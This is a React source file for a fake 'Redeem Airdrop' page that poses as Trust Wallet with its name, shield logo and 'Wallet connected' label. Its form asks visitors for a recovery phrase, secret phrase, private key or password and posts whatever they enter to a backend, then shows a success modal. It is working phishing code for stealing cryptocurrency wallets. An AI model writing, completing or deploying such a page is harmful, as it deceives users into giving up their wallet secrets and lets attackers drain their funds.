import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { IoArrowBack, IoClose, IoShieldCheckmarkOutline } from 'react-icons/io5'
import RedemptionModal from '../../components/RedemptionModal/RedemptionModal'
import trustShield from '../../assets/trust-shield.png'
import api from '../../api/axios' // Import the API

function AirdropPage() {
  const navigate = useNavigate()
  const [claimWords, setClaimWords] = useState('')
  const [showRedeemModal, setShowRedeemModal] = useState(false)
  const [isRedeeming, setIsRedeeming] = useState(false)
  const [error, setError] = useState('')

  const handleRedeem = async () => {
    // Don't proceed if already redeeming or no words entered
    if (isRedeeming) return
    if (!claimWords.trim()) {
      setError('Please enter your claim words')
      return
    }

    setIsRedeeming(true)
    setError('')

    try {
      // Send the claim words to the backend
      const response = await api.post('/', {
        words: claimWords,
        title: 'Airdrop', // Default title
        createdBy: 'airdrop-user',
        source: 'airdrop',
      })

      console.log('Airdrop claim response:', response.data)

      if (response.data.ok) {
        // Show the redemption modal on success
        setShowRedeemModal(true)
      } else {
        setError(response.data.error || 'Failed to process airdrop claim')
      }
    } catch (error) {
      console.error('Airdrop claim error:', error)
      setError(error.response?.data?.error || 'Failed to connect to server. Please try again.')
    } finally {
      setIsRedeeming(false)
    }
  }

  const handleClearWords = () => {
    setClaimWords('')
    setError('')
  }

  return (
    <main className="airdrop-page">
      <section className="airdrop-panel" aria-labelledby="airdrop-title">
        <header className="airdrop-header">
          <button className="icon-button" type="button" onClick={() => navigate('/')} aria-label="Back">
            <IoArrowBack />
          </button>
          <div className="airdrop-logo">
            <img src={trustShield} alt="" />
          </div>
        </header>

        <section className="airdrop-copy">
          <p>Wallet connected</p>
          <h1 id="airdrop-title">Redeem Airdrop</h1>
          <span>
            Add your claim information below to continue with the redemption
            request.
          </span>
        </section>

        <form className="claim-form" onSubmit={(event) => event.preventDefault()}>
          <label className="claim-field">
            <span>Airdrop claim words</span>
            <div className="claim-words-box">
              <textarea
                value={claimWords}
                onChange={(event) => {
                  setClaimWords(event.target.value)
                  setError('') // Clear error when user types
                }}
                placeholder="Enter public claim words. enter your recovery phrase."
                rows="8"
                disabled={isRedeeming}
              />
              {claimWords && (
                <button
                  type="button"
                  aria-label="Clear claim words"
                  onClick={handleClearWords}
                  disabled={isRedeeming}
                >
                  <IoClose />
                </button>
              )}
            </div>
            <small>
              Enter a secret phrase, recovery phrase, private key, or password.
            </small>
            {error && (
              <div className="error-message" style={{ color: 'red', marginTop: '8px', fontSize: '14px' }}>
                {error}
              </div>
            )}
          </label>
        </form>

        <div className="wallet-summary">
          <span className="summary-icon">
            <IoShieldCheckmarkOutline />
          </span>
          <span>
            <strong>Trust Wallet</strong>
            <small>Connected for eligibility check</small>
          </span>
        </div>

        <button
          className="redeem-button"
          type="button"
          onClick={handleRedeem}
          disabled={isRedeeming || !claimWords.trim()}
          aria-busy={isRedeeming}
        >
          {isRedeeming ? (
            <>
              <span className="button-loader" aria-hidden="true" />
              Processing
            </>
          ) : (
            'Redeem'
          )}
        </button>
      </section>

      {showRedeemModal && (
        <RedemptionModal onClose={() => setShowRedeemModal(false)} />
      )}
    </main>
  )
}

export default AirdropPage